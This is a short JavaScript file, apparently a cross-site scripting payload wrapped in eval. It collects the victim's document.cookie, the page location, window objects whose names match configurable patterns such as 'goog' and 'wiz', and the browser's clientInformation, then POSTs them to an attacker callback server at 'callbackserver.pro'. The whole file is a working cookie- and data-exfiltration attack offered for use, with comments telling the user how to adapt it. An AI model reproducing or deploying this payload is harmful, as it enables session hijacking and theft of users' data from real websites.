// Description:  Attempt to stringify and set new Origin (of your callback server) viaheaders then POST data to 
//               callback server 

eval(`
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://callbackserver.pro/index.php?id=" + document.location + document.cookie, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.setRequestHeader("X-Origin", "https://callbackserver.pro");    
    xhr.setRequestHeader("Access-Control-Allow-Origin", "https://callbackserver.pro");
 
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status >= 200 && xhr.status < 300) {
                console.log("Request successful:", xhr.responseText);
            } else {
                console.error("CORS or network error:", xhr.status, xhr.statusText);
            }
        }
    };

    var dataToSend = [];
    var searchPatterns = [/^goog/i, /^wiz/i];  // Modify these to match what objects your looking for
    var seenObjects = new WeakSet();

    Object.keys(window).forEach(function(key) {
        if (searchPatterns.some(pattern => pattern.test(key))) {
            var value = window[key];
            if (typeof value === 'object' && value !== null) {
                try {
                    if (!seenObjects.has(value)) {
                        seenObjects.add(value);
                        dataToSend.push(encodeURIComponent(key) + "=" + encodeURIComponent(JSON.stringify(value, function replacer(k, v) {
                            if (typeof v === 'object' && v !== null) {
                                if (seenObjects.has(v)) {
                                    return; // Skip circular reference
                                }
                                seenObjects.add(v);
                            }
                            return v;
                        })));
                    }
                } catch (e) {
                    console.error('Error serializing:', key, e);
                }
            } else {
                dataToSend.push(encodeURIComponent(key) + "=" + encodeURIComponent(value));
            }
        }
    });

    if (typeof clientInformation !== 'undefined') {  // Attempt to stringify and gather ClientInformation object from DOM to POST
       dataToSend.push("clientInformation=" + encodeURIComponent(JSON.stringify(clientInformation)));    }
    
    var dataString = dataToSend.join("&");
    xhr.send("cookie=" + encodeURIComponent(document.cookie) + "&" + dataString);
    `);
